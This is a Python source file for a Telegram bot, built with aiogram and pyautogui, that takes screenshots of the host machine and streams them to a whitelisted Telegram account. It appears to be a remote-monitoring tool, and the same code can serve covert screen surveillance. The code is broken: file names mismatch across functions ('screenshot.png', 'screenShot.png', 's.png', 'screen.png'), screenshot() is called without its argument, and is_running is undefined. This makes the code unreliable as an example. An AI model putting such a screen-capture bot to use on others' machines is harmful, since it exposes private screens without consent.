from aiogram import Bot, types
import pyautogui as gui
import os
import asyncio

import misc.keyboard as keyboard
from config import bot_token, whitelisted_id

# -- Init
gui.FAILSAFE = False
bot = Bot(bot_token)

async def screenshot(message):
    gui.screenshot('screenshot.png')
    await message.answer_photo(open('screenShot.png', 'rb'))

async def live_screenshot(message):
    global is_running
    try:
        os.remove("screen.png")
        await screenshot()
        a = await bot.send_photo(whitelisted_id, open("s.png", "rb"), reply_markup=keyboard.main_keyboard, caption=f"📸 Live screeen")
        os.remove("screen.png")
        while is_running:
            await screenshot()
            new_photo = types.InputMediaPhoto(media=open("s.png", "rb"))
            await a.edit_caption(f"📸 Live screen")
            await a.edit_media(
                media=new_photo,
                reply_markup=keyboard.main_keyboard,
            )
            os.remove("screen.png")
            await asyncio.sleep(0.8)
    except FileNotFoundError:
        await screenshot()
        a = await bot.send_photo(whitelisted_id, open("s.png", "rb"), reply_markup=keyboard.main_keyboard, caption=f"📸 Live screen")
        os.remove("screen.png")
        while is_running:
            await screenshot()
            new_photo = types.InputMediaPhoto(media=open("s.png", "rb"))
            await a.edit_caption(f"📸 Live screen")
            await a.edit_media(
                media=new_photo,
                reply_markup=keyboard.main_keyboard,
            )
            os.remove("screen.png")
            await asyncio.sleep(0.8)